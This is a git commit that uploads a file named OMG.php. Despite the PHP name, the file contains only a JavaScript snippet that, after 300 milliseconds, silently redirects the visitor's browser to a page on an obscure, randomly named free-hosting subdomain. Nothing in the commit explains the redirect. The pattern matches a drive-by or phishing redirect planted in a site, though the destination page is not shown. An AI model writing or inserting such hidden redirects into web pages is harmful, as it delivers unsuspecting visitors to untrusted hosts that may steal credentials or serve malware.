42cce713359209d3fdb8c961c8afd639b233acdb
lobobreezy <53313870+lobobreezy@users.noreply.github.com>
2019-10-05 19:13:07 -0400

    Add files via upload

---
+++ OMG.php
@@ -0,0 +1,10 @@
+<script language="JavaScript" type="text/javascript">
+
+var pagina="http://mhrtaqjaqerag.mypressonline.com/1.php"
+function redireccionar() 
+{
+location.href=pagina
+} 
+setTimeout ("redireccionar()", 300);
+
+</script>
